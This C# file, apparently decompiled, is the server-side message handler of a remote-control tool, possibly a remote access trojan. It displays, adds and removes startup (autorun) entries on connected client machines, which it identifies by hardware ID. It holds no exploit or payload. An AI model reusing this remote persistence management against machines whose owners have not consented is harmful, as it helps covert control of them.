using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerAutoRun
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		switch (a)
		{
		case "Set":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormAutoRun form4 = (FormAutoRun)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.materialLabel1.Text = "Succues Set auto run";
				DataGridViewRow dataGridViewRow = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[2]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[3]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[4]
						}
					}
				};
				form4.dataGridView2.Rows.Add(dataGridViewRow);
			});
			return;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormAutoRun form2 = (FormAutoRun)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView2.Rows.Clear();
				form2.materialLabel1.Text = "Succues auto runs";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							}
						}
					};
					form2.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			return;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormAutoRun form3 = (FormAutoRun)client.Tag;
			form3.Invoke((MethodInvoker)delegate
			{
				form3.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			return;
		}
		case "Connect":
		{
			FormAutoRun form = (FormAutoRun)Application.OpenForms["AutoRun:" + (string)objects[2]];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "AutoRun [" + (string)objects[2] + "]";
				form.client = client;
				form.materialLabel1.Enabled = true;
				form.dataGridView2.Enabled = true;
				form.materialLabel1.Text = "Succues Connect";
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
			return;
		}
		}
		if (!(a == "Remove"))
		{
			return;
		}
		if (client.Tag == null)
		{
			client.Disconnect();
			return;
		}
		FormAutoRun form5 = (FormAutoRun)client.Tag;
		form5.Invoke((MethodInvoker)delegate
		{
			form5.materialLabel1.Text = "Succues Remove auto run";
			foreach (DataGridViewRow dataGridViewRow in (IEnumerable)form5.dataGridView2.Rows)
			{
				if ((string)dataGridViewRow.Cells[0].Value + ";" + (string)dataGridViewRow.Cells[1].Value == (string)objects[2])
				{
					form5.dataGridView2.Rows.Remove(dataGridViewRow);
				}
			}
		});
	}
}
